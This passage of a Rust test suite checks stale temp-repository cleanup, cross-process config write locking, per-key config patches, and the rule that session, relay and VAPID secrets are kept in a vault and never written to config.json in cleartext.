            "a path that still exists on disk must never be swept up"
        );
    }

    #[test]
    fn only_not_found_metadata_errors_prove_the_path_is_missing() {
        assert!(metadata_error_proves_missing(&std::io::Error::from(
            std::io::ErrorKind::NotFound
        )));
        for kind in [
            std::io::ErrorKind::PermissionDenied,
            std::io::ErrorKind::InvalidData,
            std::io::ErrorKind::Other,
        ] {
            assert!(
                !metadata_error_proves_missing(&std::io::Error::from(kind)),
                "{kind:?} must preserve the repository row"
            );
        }
    }

    #[test]
    fn survives_outside_a_recognized_temp_root() {
        // Nonexistent, non-git, empty-shell — everything a real ghost looks
        // like — except it is not under a temp root. A legitimate repository
        // on an unmounted drive or a machine the user is away from looks
        // exactly like this, and must survive.
        let path = "/Users/boss/Gits/offline-project-not-mounted-right-now".to_string();
        let repo = stale_temp_repo_json(&path);
        assert!(classify_stale_temp_repo(&path, &repo).is_none());
    }

    #[test]
    fn survives_when_is_git_repo_is_not_explicitly_false() {
        let path = stale_temp_candidate_path();
        let mut repo = stale_temp_repo_json(&path);
        repo.as_object_mut().unwrap().remove("isGitRepo");
        assert!(classify_stale_temp_repo(&path, &repo).is_none());
    }

    #[test]
    fn survives_a_repo_with_more_than_one_workspace() {
        let path = stale_temp_candidate_path();
        let mut repo = stale_temp_repo_json(&path);
        repo["workspaces"]["feature"] = shell_workspace_json();
        assert!(classify_stale_temp_repo(&path, &repo).is_none());
    }

    #[test]
    fn survives_a_workspace_with_a_live_terminal() {
        let path = stale_temp_candidate_path();
        let mut repo = stale_temp_repo_json(&path);
        repo["workspaces"]["main"]["terminals"] = serde_json::json!(["term-1"]);
        assert!(classify_stale_temp_repo(&path, &repo).is_none());
    }

    #[test]
    fn survives_a_workspace_with_saved_terminals() {
        let path = stale_temp_candidate_path();
        let mut repo = stale_temp_repo_json(&path);
        repo["workspaces"]["main"]["savedTerminals"] = serde_json::json!([{"agentType": null}]);
        assert!(classify_stale_temp_repo(&path, &repo).is_none());
    }

    #[test]
    fn survives_a_workspace_with_diffstat_or_commit_state() {
        let path = stale_temp_candidate_path();
        let mut repo = stale_temp_repo_json(&path);
        repo["workspaces"]["main"]["additions"] = serde_json::json!(3);
        assert!(classify_stale_temp_repo(&path, &repo).is_none());

        let mut repo2 = stale_temp_repo_json(&path);
        repo2["workspaces"]["main"]["lastCommitTs"] = serde_json::json!(1_726_000_000);
        assert!(classify_stale_temp_repo(&path, &repo2).is_none());
    }

    #[test]
    fn survives_a_repo_with_a_connection_id_or_initials() {
        let path = stale_temp_candidate_path();
        let mut repo = stale_temp_repo_json(&path);
        repo["connectionId"] = serde_json::json!("remote-1");
        assert!(classify_stale_temp_repo(&path, &repo).is_none());

        let mut repo2 = stale_temp_repo_json(&path);
        repo2["initials"] = serde_json::json!("MP");
        assert!(classify_stale_temp_repo(&path, &repo2).is_none());
    }

    #[test]
    fn survives_a_parked_repo() {
        let path = stale_temp_candidate_path();
        let mut repo = stale_temp_repo_json(&path);
        repo["parked"] = serde_json::json!(true);
        assert!(
            classify_stale_temp_repo(&path, &repo).is_none(),
            "a repo the user deliberately parked is never a ghost"
        );
    }

    #[test]
    fn survives_when_is_shell_is_missing() {
        let path = stale_temp_candidate_path();
        let mut repo = stale_temp_repo_json(&path);
        repo["workspaces"]["main"]
            .as_object_mut()
            .unwrap()
            .remove("isShell");
        assert!(
            classify_stale_temp_repo(&path, &repo).is_none(),
            "isShell must be explicitly true, never merely absent"
        );
    }

    #[test]
    fn survives_when_is_shell_is_false() {
        let path = stale_temp_candidate_path();
        let mut repo = stale_temp_repo_json(&path);
        repo["workspaces"]["main"]["isShell"] = serde_json::json!(false);
        assert!(classify_stale_temp_repo(&path, &repo).is_none());
    }

    #[test]
    fn survives_a_path_traversal_out_of_the_temp_root() {
        // Lexically starts with the temp root by component prefix, but a `..`
        // component means it does not actually resolve under it.
        let escaped = std::env::temp_dir()
            .join("..")
            .join("legit-project")
            .to_string_lossy()
            .to_string();
        let repo = stale_temp_repo_json(&escaped);
        assert!(
            classify_stale_temp_repo(&escaped, &repo).is_none(),
            "a path containing `..` must never be treated as living under a temp root"
        );
    }

    #[test]
    #[serial_test::serial]
    fn repair_removes_only_the_named_stale_temp_rows_and_writes_a_backup() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let ghost_path = stale_temp_candidate_path();
        replace_repositories_for_test(serde_json::json!({
            "repos": {
                "/keep": seed_repo_with_diffstat(12, "keep-me"),
                (ghost_path.clone()): stale_temp_repo_json(&ghost_path),
            },
            "repoOrder": ["/keep", ghost_path.clone()],
            "activeRepoPath": ghost_path.clone(),
            "groups": {
                "g1": { "id": "g1", "name": "Group", "color": "", "collapsed": false, "repoOrder": [ghost_path.clone()] }
            },
            "groupOrder": ["g1"],
        }))
        .expect("seed repositories");

        let summary = repair_stale_temp_repositories_request(vec![ghost_path.clone()])
            .expect("repair must succeed for a genuinely stale row");
        assert_eq!(summary.removed, vec![ghost_path.clone()]);
        assert!(
            std::path::Path::new(&summary.backup_path).is_file(),
            "backup file must exist at the returned path"
        );

        let saved = load_repositories();
        assert!(saved["repos"].get(ghost_path.as_str()).is_none());
        assert!(saved["repos"].get("/keep").is_some());
        assert!(
            !saved["repoOrder"]
                .as_array()
                .unwrap()
                .iter()
                .any(|v| v == &serde_json::json!(ghost_path)),
            "removed row must leave repoOrder"
        );
        assert_eq!(saved["activeRepoPath"], serde_json::Value::Null);
        assert!(
            !saved["groups"]["g1"]["repoOrder"]
                .as_array()
                .unwrap()
                .iter()
                .any(|v| v == &serde_json::json!(ghost_path)),
            "removed row must leave every group's repoOrder too"
        );

        let backup: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(&summary.backup_path).unwrap()).unwrap();
        assert!(
            backup["repos"].get(ghost_path.as_str()).is_some(),
            "backup must hold the exact pre-repair document"
        );
        assert!(backup["repos"].get("/keep").is_some());
    }

    #[test]
    #[serial_test::serial]
    fn repair_refuses_the_whole_batch_when_one_path_no_longer_classifies() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let ghost_a = stale_temp_candidate_path();
        let ghost_b = format!("{ghost_a}-b");
        let mut repo_b = stale_temp_repo_json(&ghost_b);
        repo_b["isGitRepo"] = serde_json::json!(true); // reconnected since the preview
        replace_repositories_for_test(serde_json::json!({
            "repos": { (ghost_a.clone()): stale_temp_repo_json(&ghost_a), (ghost_b.clone()): repo_b },
            "repoOrder": [ghost_a.clone(), ghost_b.clone()], "groups": {}, "groupOrder": [],
        }))
        .expect("seed repositories");

        let error = repair_stale_temp_repositories_request(vec![ghost_a.clone(), ghost_b.clone()])
            .expect_err("a request naming even one non-stale row must be refused entirely");
        assert!(error.contains(ghost_b.as_str()), "{error}");

        let saved = load_repositories();
        assert!(
            saved["repos"].get(ghost_a.as_str()).is_some(),
            "the still-stale row must survive an all-or-nothing refusal, not be removed alone"
        );
        assert!(saved["repos"].get(ghost_b.as_str()).is_some());
    }

    #[test]
    fn repair_rejects_an_empty_request() {
        repair_stale_temp_repositories_request(vec![])
            .expect_err("must refuse an empty repair request rather than no-op silently");
    }

    #[test]
    #[serial_test::serial]
    fn repair_dedupes_a_repeated_path_in_the_request() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let ghost = stale_temp_candidate_path();
        replace_repositories_for_test(serde_json::json!({
            "repos": { (ghost.clone()): stale_temp_repo_json(&ghost) },
            "repoOrder": [ghost.clone()], "groups": {}, "groupOrder": [],
        }))
        .expect("seed repositories");

        let summary = repair_stale_temp_repositories_request(vec![ghost.clone(), ghost.clone()])
            .expect("repair must succeed");

        assert_eq!(
            summary.removed,
            vec![ghost],
            "a path repeated in the request must be echoed exactly once, not once per occurrence"
        );
    }

    #[test]
    #[serial_test::serial]
    fn repair_refuses_a_row_that_was_never_stale() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        replace_repositories_for_test(serde_json::json!({
            "repos": {"/legit": seed_repo_with_diffstat(1, "legit")},
            "repoOrder": ["/legit"], "groups": {}, "groupOrder": [],
        }))
        .expect("seed repositories");

        repair_stale_temp_repositories_request(vec!["/legit".to_string()])
            .expect_err("a legitimate repository must never be repaired away");

        let saved = load_repositories();
        assert!(saved["repos"].get("/legit").is_some());
    }

    /// Two-process harness entry point for
    /// `load_app_config_migration_survives_concurrent_cross_process_write` below. Under
    /// a normal test run (`TUIC_CONFIG_TEST_ROLE` unset) this is a no-op — its job is to
    /// be re-invoked as a genuine CHILD OS PROCESS via `std::env::current_exe()`, so the
    /// file lock under test contends across two processes instead of two threads
    /// sharing one in-process `CONFIG_WRITE_LOCK`.
    #[test]
    fn two_process_child() {
        let Ok(role) = std::env::var("TUIC_CONFIG_TEST_ROLE") else {
            return;
        };
        let dir =
            PathBuf::from(std::env::var("TUIC_CONFIG_TEST_DIR").expect("TUIC_CONFIG_TEST_DIR"));
        let _guard = set_config_dir_override(dir);

        match role.as_str() {
            // TUIC_TEST_LOAD_APP_CONFIG_DELAY_MS (consumed inside load_app_config via
            // test_load_app_config_delay) widens the read-to-write window so the
            // parent process's concurrent write reliably lands inside it.
            "reader" => {
                load_app_config();
            }
            "delta-font" | "delta-collapse" => {
                // Each child captures the same stale process cache before either is
                // released to save. The production commit path must apply only its
                // cached-to-requested delta to the latest locked disk document.
                let cached = load_app_config();
                let state = crate::state::tests_support::make_test_app_state();
                *state.config.write() = cached;

                std::fs::write(config_dir().join(format!("{role}.ready")), b"ready")
                    .expect("write child ready marker");
                let release = config_dir().join("delta.release");
                let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
                while !release.exists() {
                    assert!(
                        std::time::Instant::now() < deadline,
                        "timed out waiting for delta test release"
                    );
                    std::thread::sleep(std::time::Duration::from_millis(10));
                }

                commit_config_change(&state, |current| {
                    let mut next = current.clone();
                    if role == "delta-font" {
                        next.font_size = 18;
                    } else {
                        next.collapse_tools = true;
                    }
                    Ok(next)
                })
                .expect("commit child config delta");
            }
            // One child patches a single key, the other saves a whole document — the
            // exact pairing `save_config` and a future `config_patch` produce in the
            // field when a debug and a release build share one config directory.
            "patch-font" | "whole-save-collapse" => {
                let cached = load_app_config();
                let state = crate::state::tests_support::make_test_app_state();
                *state.config.write() = cached;

                std::fs::write(config_dir().join(format!("{role}.ready")), b"ready")
                    .expect("write child ready marker");
                let release = config_dir().join("patch.release");
                let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
                while !release.exists() {
                    assert!(
                        std::time::Instant::now() < deadline,
                        "timed out waiting for patch test release"
                    );
                    std::thread::sleep(std::time::Duration::from_millis(10));
                }

                if role == "patch-font" {
                    apply_config_patch(&state, "font_size", serde_json::json!(18))
                        .expect("child config patch");
                } else {
                    // Byte-for-byte what `save_config` does with a whole AppConfig.
                    commit_config_change(&state, |current| {
                        let mut next = current.clone();
                        next.collapse_tools = true;
                        Ok(next)
                    })
                    .expect("child whole-object save");
                }
            }
            "repo-delta-a" | "repo-delta-b" => {
                let path = if role == "repo-delta-a" { "/a" } else { "/b" };
                std::fs::write(config_dir().join(format!("{role}.ready")), b"ready")
                    .expect("write repository child ready marker");
                let release = config_dir().join("repo-delta.release");
                let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
                while !release.exists() {
                    assert!(
                        std::time::Instant::now() < deadline,
                        "timed out waiting for repository delta test release"
                    );
                    std::thread::sleep(std::time::Duration::from_millis(10));
                }
                save_repositories(serde_json::json!({
                    "mutationVersion": 1,
                    "repos": [{
                        "id": path,
                        "before": null,
                        "after": {"path":path,"displayName":path,"branches":{}}
                    }],
                    "groups": [],
                    "repoOrder": {"before":[],"after":[path]}
                }))
                .expect("commit child repository delta");
            }
            other => panic!("unknown TUIC_CONFIG_TEST_ROLE: {other}"),
        }
    }

    /// The two tests above prove `load_app_config`'s migration read-to-write window is
    /// atomic against a concurrent writer — but only within ONE process, because both
    /// sides share the same in-process `CONFIG_WRITE_LOCK`. A prior fix attempt tested
    /// exactly that: two THREADS in one process. Since the second thread's
    /// `load_app_config()` call always blocks on that shared mutex until the first
    /// thread's write finishes, the read can never actually land inside a concurrent
    /// writer's window — the thread test passed against the buggy code AND the fixed
    /// code, proving nothing about the case this file lock exists for: a debug build and
    /// a release build, i.e. two separate OS processes, sharing one config directory.
    ///
    /// This test spawns the reader as a genuine second process (`std::process::Command`
    /// re-invoking the test binary itself, selected into "child" behavior via
    /// `TUIC_CONFIG_TEST_ROLE`). Advisory file locks (`std::fs::File::lock`) are tied to
    /// the open file description, not the process or thread, so only a second process —
    /// with its own independent open of the lock file — can actually contend for it.
    #[test]
    #[serial_test::serial]
    fn load_app_config_migration_survives_concurrent_cross_process_write() {
        crate::credentials::reset_test_faults();
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        // Seed a config with a plaintext secret (forces the migration-write branch) and
        // a recognizable starting value.
        let mut seed = AppConfig::default();
        seed.services.auth.session_token = "plaintext-secret".to_string();
        seed.font_size = 1;
        std::fs::write(
            dir.path().join(APP_CONFIG_FILE),
            serde_json::to_string_pretty(&seed).unwrap(),
        )
        .unwrap();

        let exe = std::env::current_exe().expect("current_exe");
        let mut child = std::process::Command::new(&exe)
            .arg("two_process_child")
            .env("TUIC_CONFIG_TEST_ROLE", "reader")
            .env("TUIC_CONFIG_TEST_DIR", dir.path())
            .env("TUIC_TEST_LOAD_APP_CONFIG_DELAY_MS", "1000")
            .spawn()
            .expect("spawn child reader process");

        // Give the child comfortably long enough to open and read config.json and enter
        // its artificial 1s delay before this process — a second, independent OS
        // process — writes a newer value through the same lock file.
        std::thread::sleep(std::time::Duration::from_millis(300));

        ConfigFile::<AppConfig>::new(APP_CONFIG_FILE)
            .update(|cfg| {
                cfg.font_size = 42;
                true
            })
            .expect("concurrent cross-process writer update");

        let status = child.wait().expect("wait for child reader process");
        assert!(status.success(), "child reader process failed: {status:?}");

        let on_disk: AppConfig = serde_json::from_str(
            &std::fs::read_to_string(dir.path().join(APP_CONFIG_FILE)).unwrap(),
        )
        .unwrap();
        assert_eq!(
            on_disk.font_size, 42,
            "the migration branch's write, in a SEPARATE process, clobbered this \
             process's newer concurrent write with the stale value it read before that \
             write landed on disk"
        );
    }

    /// Ordinary interactive saves, not just the secret-migration branch above, must
    /// compose across real process boundaries. Both child processes load the same stale
    /// AppConfig before either writes; each changes one independent field through
    /// `commit_config_change`. A whole-document implementation deterministically loses
    /// one field, while delta-under-lock retains both.
    #[test]
    #[serial_test::serial]
    fn ordinary_app_config_deltas_compose_across_two_processes() {
        crate::credentials::reset_test_faults();
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let seed = AppConfig::default();
        std::fs::write(
            dir.path().join(APP_CONFIG_FILE),
            serde_json::to_string_pretty(&seed).unwrap(),
        )
        .unwrap();

        let exe = std::env::current_exe().expect("current_exe");
        let mut children = ["delta-font", "delta-collapse"].map(|role| {
            std::process::Command::new(&exe)
                .arg("two_process_child")
                .env("TUIC_CONFIG_TEST_ROLE", role)
                .env("TUIC_CONFIG_TEST_DIR", dir.path())
                .spawn()
                .unwrap_or_else(|e| panic!("spawn {role} child: {e}"))
        });

        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
        for role in ["delta-font", "delta-collapse"] {
            let ready = dir.path().join(format!("{role}.ready"));
            while !ready.exists() {
                assert!(
                    std::time::Instant::now() < deadline,
                    "timed out waiting for {role} child"
                );
                std::thread::sleep(std::time::Duration::from_millis(10));
            }
        }
        std::fs::write(dir.path().join("delta.release"), b"release").unwrap();

        for child in &mut children {
            let status = child.wait().expect("wait for delta child");
            assert!(status.success(), "delta child failed: {status:?}");
        }

        let on_disk: AppConfig = serde_json::from_str(
            &std::fs::read_to_string(dir.path().join(APP_CONFIG_FILE)).unwrap(),
        )
        .unwrap();
        assert_eq!(on_disk.font_size, 18, "font delta was lost");
        assert!(on_disk.collapse_tools, "collapse-tools delta was lost");
    }

    #[test]
    #[serial_test::serial]
    fn stale_app_config_saves_in_one_process_preserve_independent_changes() {
        crate::credentials::reset_test_faults();
        let dir = TempDir::new().unwrap();
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = crate::state::tests_support::make_test_app_state();
        let base = state.config.read().clone();
        let mut first = base.clone();
        first.font_size = 21;
        let mut second = base.clone();
        second.collapse_tools = true;
        commit_config_save(&state, base.clone(), first).unwrap();
        commit_config_save(&state, base, second).unwrap();
        let saved = load_app_config();
        assert_eq!(saved.font_size, 21);
        assert!(saved.collapse_tools);
    }

    #[test]
    #[serial_test::serial]
    fn config_patch_applies_only_the_named_key() {
        crate::credentials::reset_test_faults();
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = crate::state::tests_support::make_test_app_state();
        let before = state.config.read().clone();

        apply_config_patch(&state, "font_size", serde_json::json!(21)).expect("patch font_size");

        assert_eq!(state.config.read().font_size, 21);
        let on_disk: AppConfig = serde_json::from_str(
            &std::fs::read_to_string(dir.path().join(APP_CONFIG_FILE)).unwrap(),
        )
        .unwrap();
        assert_eq!(on_disk.font_size, 21);
        assert_eq!(
            on_disk.theme, before.theme,
            "a per-key patch must not disturb unrelated fields"
        );
    }

    #[test]
    #[serial_test::serial]
    fn config_patch_applies_a_nested_key() {
        crate::credentials::reset_test_faults();
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = crate::state::tests_support::make_test_app_state();

        apply_config_patch(&state, "services.server.port", serde_json::json!(9911))
            .expect("patch nested key");

        assert_eq!(state.config.read().services.server.port, 9911);
    }

    /// `AppConfig` has no `deny_unknown_fields`, so serde silently DROPS a misspelled
    /// key: without this check a typo would report success and change nothing.
    #[test]
    #[serial_test::serial]
    fn config_patch_rejects_an_unknown_path() {
        crate::credentials::reset_test_faults();
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = crate::state::tests_support::make_test_app_state();

        let err = apply_config_patch(&state, "font_sizee", serde_json::json!(21))
            .expect_err("an unknown path must be rejected, not silently dropped");
        assert!(err.contains("font_sizee"), "unhelpful error: {err}");
    }

    #[test]
    #[serial_test::serial]
    fn config_patch_rejects_a_type_mismatch() {
        crate::credentials::reset_test_faults();
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = crate::state::tests_support::make_test_app_state();

        apply_config_patch(&state, "font_size", serde_json::json!("enormous"))
            .expect_err("a string is not a valid font_size");
        assert_eq!(
            state.config.read().font_size,
            AppConfig::default().font_size,
            "a rejected patch must leave the cached config untouched"
        );
    }

    #[test]
    #[serial_test::serial]
    fn config_patch_rejects_a_malformed_path() {
        crate::credentials::reset_test_faults();
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = crate::state::tests_support::make_test_app_state();

        apply_config_patch(&state, "", serde_json::json!(1)).expect_err("empty path");
        apply_config_patch(&state, "services..port", serde_json::json!(1))
            .expect_err("empty segment");
        apply_config_patch(&state, "font_size.nested", serde_json::json!(1))
            .expect_err("cannot descend into a scalar");
    }

    /// The story's core claim: a per-key patch and a whole-object save running in two
    /// SEPARATE OS PROCESSES must both survive. Two threads would prove nothing — they
    /// share `CONFIG_WRITE_LOCK`, so the second always sees the first's write. Only a
    /// real second process contends for the advisory file lock, which is tied to the
    /// open file description rather than the process.
    #[test]
    #[serial_test::serial]
    fn config_patch_and_whole_object_save_compose_across_two_processes() {
        crate::credentials::reset_test_faults();
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let seed = AppConfig::default();
        std::fs::write(
            dir.path().join(APP_CONFIG_FILE),
            serde_json::to_string_pretty(&seed).unwrap(),
        )
        .unwrap();

        let exe = std::env::current_exe().expect("current_exe");
        let mut children = ["patch-font", "whole-save-collapse"].map(|role| {
            std::process::Command::new(&exe)
                .arg("two_process_child")
                .env("TUIC_CONFIG_TEST_ROLE", role)
                .env("TUIC_CONFIG_TEST_DIR", dir.path())
                .spawn()
                .unwrap_or_else(|e| panic!("spawn {role} child: {e}"))
        });

        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
        for role in ["patch-font", "whole-save-collapse"] {
            let ready = dir.path().join(format!("{role}.ready"));
            while !ready.exists() {
                assert!(
                    std::time::Instant::now() < deadline,
                    "timed out waiting for {role} child"
                );
                std::thread::sleep(std::time::Duration::from_millis(10));
            }
        }
        // Both children now hold the SAME stale cache. Releasing them together is what
        // makes the two writes overlap.
        std::fs::write(dir.path().join("patch.release"), b"release").unwrap();

        for child in &mut children {
            let status = child.wait().expect("wait for patch child");
            assert!(status.success(), "patch child failed: {status:?}");
        }

        let on_disk: AppConfig = serde_json::from_str(
            &std::fs::read_to_string(dir.path().join(APP_CONFIG_FILE)).unwrap(),
        )
        .unwrap();
        assert_eq!(on_disk.font_size, 18, "the per-key patch was lost");
        assert!(
            on_disk.collapse_tools,
            "the whole-object save was lost by the concurrent patch"
        );
    }

    #[test]
    #[serial_test::serial]
    fn repository_deltas_compose_across_two_processes() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        replace_repositories_for_test(serde_json::json!({
            "repos": {}, "repoOrder": [], "groups": {}, "groupOrder": []
        }))
        .expect("seed repositories");

        let exe = std::env::current_exe().expect("current_exe");
        let mut children = ["repo-delta-a", "repo-delta-b"].map(|role| {
            std::process::Command::new(&exe)
                .arg("two_process_child")
                .env("TUIC_CONFIG_TEST_ROLE", role)
                .env("TUIC_CONFIG_TEST_DIR", dir.path())
                .spawn()
                .unwrap_or_else(|error| panic!("spawn {role} child: {error}"))
        });

        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
        for role in ["repo-delta-a", "repo-delta-b"] {
            let ready = dir.path().join(format!("{role}.ready"));
            while !ready.exists() {
                assert!(
                    std::time::Instant::now() < deadline,
                    "timed out waiting for {role} child"
                );
                std::thread::sleep(std::time::Duration::from_millis(10));
            }
        }
        std::fs::write(dir.path().join("repo-delta.release"), b"release").unwrap();

        for child in &mut children {
            let status = child.wait().expect("wait for repository delta child");
            assert!(
                status.success(),
                "repository delta child failed: {status:?}"
            );
        }

        let saved = load_repositories();
        assert!(
            saved["repos"].get("/a").is_some(),
            "process A's add was lost"
        );
        assert!(
            saved["repos"].get("/b").is_some(),
            "process B's add was lost"
        );
        let order = saved["repoOrder"].as_array().expect("repoOrder array");
        assert_eq!(order.len(), 2);
        assert!(order.contains(&serde_json::json!("/a")));
        assert!(order.contains(&serde_json::json!("/b")));
    }

    #[test]
    fn app_config_delta_distinguishes_unchanged_fields_from_an_intentional_clear() {
        let base = AppConfig {
            global_hotkey: Some("CommandOrControl+Shift+T".to_string()),
            ..AppConfig::default()
        };
        let mut desired = base.clone();
        desired.global_hotkey = None;

        let delta = app_config_delta(&base, &desired).expect("derive delta");
        assert_eq!(delta.get("global_hotkey"), Some(&serde_json::Value::Null));
        assert!(
            delta.get("font_size").is_none(),
            "unchanged fields must be omitted, not mistaken for replacements"
        );

        let mut concurrently_changed = base;
        concurrently_changed.font_size = 22;
        let merged = merge_partial_app_config(&concurrently_changed, delta).expect("apply delta");
        assert_eq!(merged.font_size, 22, "unrelated concurrent change was lost");
        assert_eq!(merged.global_hotkey, None, "intentional clear was ignored");
    }

    /// Criteria 2 and 3 of #484-1a07 say "on disk", and that is the assertion that
    /// matters: the unit tests above prove `merge_partial_app_config` returns the
    /// right value, but the defect was what got PERSISTED. This drives the exact
    /// composition both `PUT /config` and the MCP `config action=save` use —
    /// `commit_config_change(state, |current| merge_partial_app_config(current, body))`
    /// — and then reads config.json back off the filesystem.
    #[test]
    fn a_partial_save_leaves_remote_access_enabled_on_disk() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = crate::state::tests_support::make_test_app_state();
        {
            let mut cfg = state.config.write();
            cfg.services.server.enabled = true;
            cfg.services.server.port = 9876;
        }

        // A body that says nothing whatsoever about remote access.
        let effects = commit_config_change(&state, |current| {
            merge_partial_app_config(current, serde_json::json!({ "font_size": 18 }))
        })
        .expect("partial save");

        let on_disk = load_app_config();
        assert!(
            on_disk.services.server.enabled,
            "a partial save must not switch remote access off ON DISK"
        );
        assert_eq!(on_disk.services.server.port, 9876);
        assert_eq!(on_disk.font_size, 18);
        assert!(
            !effects.server_changed,
            "an untouched listener must not trigger a needless rebind"
        );
    }

    /// The other half of criterion 4: a save that DOES change remote access must
    /// report it, because that flag is what makes the three writers rebind the
    /// listener instead of leaving the process serving a config the disk
    /// disagrees with until the next boot.
    #[test]
    fn a_save_that_changes_remote_access_asks_for_a_rebind() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = crate::state::tests_support::make_test_app_state();
        state.config.write().services.server.enabled = true;

        let effects = commit_config_change(&state, |current| {
            merge_partial_app_config(
                current,
                serde_json::json!({ "services": { "server": { "port": 9999 } } }),
            )
        })
        .expect("port change");

        assert!(effects.server_changed, "a port change must rebind");
        assert_eq!(load_app_config().services.server.port, 9999);
        assert!(
            load_app_config().services.server.enabled,
            "and the sibling must still survive the merge"
        );
    }

    /// A failing mutation must leave both memory and disk untouched.
    #[test]
    fn a_rejected_mutation_changes_nothing() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = crate::state::tests_support::make_test_app_state();
        let before = state.config.read().font_size;

        let err = commit_config_change(&state, |_| Err("nope".to_string())).unwrap_err();
        assert_eq!(err, "nope");
        assert_eq!(state.config.read().font_size, before);
    }

    /// Every writer must route through `config_for_disk`. `agent_mcp` used to call
    /// `save_json_config("config.json", &snapshot)` directly, which skips the stripping
    /// step and wrote the session token, relay token and VAPID private key to disk in
    /// cleartext — defeating the vault entirely. Going through `commit_config_change`
    /// makes that impossible for any caller.
    #[test]
    fn a_commit_never_leaves_a_secret_in_the_file() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = crate::state::tests_support::make_test_app_state();
        {
            let mut cfg = state.config.write();
            cfg.services.auth.session_token = "session-secret".to_string();
            cfg.services.auth.session_token_exists = true;
            cfg.services.relay.token = "relay-secret".to_string();
            cfg.services.relay.token_exists = Some(true);
            cfg.services.push.vapid_private_key = "vapid-secret".to_string();
            cfg.services.push.vapid_private_key_exists = true;
        }

        // A mutation that says nothing about secrets — the shape every incidental
        // writer (disabled_mcp_agents, global_hotkey, push auto-enable) has.
        commit_config_change(&state, |current| {
            let mut next = current.clone();
            next.disabled_mcp_agents = vec!["claude".to_string()];
            Ok(next)
        })
        .expect("commit");

        let raw = std::fs::read_to_string(dir.path().join(APP_CONFIG_FILE)).expect("read file");
        for secret in ["session-secret", "relay-secret", "vapid-secret"] {
            assert!(
                !raw.contains(secret),
                "{secret} was written to config.json in cleartext"
            );
        }
        // And the secrets are still reachable, i.e. they were moved, not dropped.
        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::RemoteSessionToken)
                .expect("vault readable"),
            Some("session-secret".to_string())
        );
        assert_eq!(
            load_app_config().disabled_mcp_agents,
            vec!["claude".to_string()]
        );
    }

    #[test]
    #[serial_test::serial]
    fn failed_token_rotation_restores_vault_disk_and_runtime() {
        let dir = tempfile::tempdir().expect("tempdir");
        let invalid_config_dir = dir.path().join("not-a-directory");
        std::fs::write(&invalid_config_dir, b"file blocks create_dir_all").unwrap();
        let _guard = set_config_dir_override(invalid_config_dir);
        crate::credentials::reset_test_faults();
        crate::credentials::set(
            crate::credentials::Credential::RemoteSessionToken,
            "old-token",
        )
        .unwrap();
        let state = crate::state::tests_support::make_test_app_state();
        state.config.write().services.auth.session_token = "old-token".to_string();
        state.config.write().services.auth.session_token_exists = true;
        *state.session_token.write() = "old-token".to_string();

        let error = rotate_session_token(&state).expect_err("disk persistence must fail");

        assert!(error.contains("Failed to create directory"), "{error}");
        assert_eq!(*state.session_token.read(), "old-token");
        assert_eq!(state.config.read().services.auth.session_token, "old-token");
        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::RemoteSessionToken).unwrap(),
            Some("old-token".to_string())
        );
    }

    #[test]
    #[serial_test::serial]
    fn failed_multi_secret_commit_restores_every_vault_value() {
        let dir = tempfile::tempdir().expect("tempdir");
        let invalid_config_dir = dir.path().join("not-a-directory");
        std::fs::write(&invalid_config_dir, b"file blocks create_dir_all").unwrap();
        let _guard = set_config_dir_override(invalid_config_dir);
        crate::credentials::reset_test_faults();
        for (credential, value) in [
            (
                crate::credentials::Credential::RemoteSessionToken,
                "old-session",
            ),
            (crate::credentials::Credential::RelayToken, "old-relay"),
            (
                crate::credentials::Credential::PushVapidPrivateKey,
                "old-vapid",
            ),
        ] {
            crate::credentials::set(credential, value).unwrap();
        }
        let state = crate::state::tests_support::make_test_app_state();

        let error = commit_config_change(&state, |current| {
            let mut next = current.clone();
            next.services.auth.session_token = "new-session".to_string();
            next.services.auth.session_token_exists = true;
            next.services.relay.token = "new-relay".to_string();
            next.services.relay.token_exists = Some(true);
            next.services.push.vapid_private_key = "new-vapid".to_string();
            next.services.push.vapid_private_key_exists = true;
            Ok(next)
        })
        .expect_err("disk persistence must fail");

        assert!(error.contains("Failed to create directory"), "{error}");
        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::RemoteSessionToken).unwrap(),
            Some("old-session".to_string())
        );
        assert_eq!(
